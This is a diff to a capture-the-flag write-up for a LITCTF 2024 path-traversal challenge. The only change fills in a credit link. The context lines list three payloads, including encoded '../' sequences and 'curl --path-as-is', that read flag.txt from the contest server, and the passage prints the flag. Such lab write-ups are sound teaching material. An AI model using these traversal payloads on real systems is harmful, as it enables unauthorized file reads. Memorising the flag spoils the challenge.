@@ -166,7 +166,7 @@ Basically, what I didn’t notice is that the server or browser (not sure which 
 
 
 1. ```http://litctf.org:31778/..%2fflag.txt```  (credit to @beerpsi from Discord)
-2. ```curl http://litctf.org:31778/%2e%2e/%2e%2e/%2e%2e/proc/self/cwd/flag.txt``` (credit to [https://hxuu.github.io/blog/ctf/lit24/traversed/]() )
+2. ```curl http://litctf.org:31778/%2e%2e/%2e%2e/%2e%2e/proc/self/cwd/flag.txt``` (credit to [https://hxuu.github.io/blog/ctf/lit24/traversed/](https://hxuu.github.io/blog/ctf/lit24/traversed/) )
 3. ```curl --path-as-is http://litctf.org:31778/../flag.txt``` (credit to @nikloskoda from Discord)
 
 Flag is - ``` LITCTF{backtr@ked_230fim0} ```
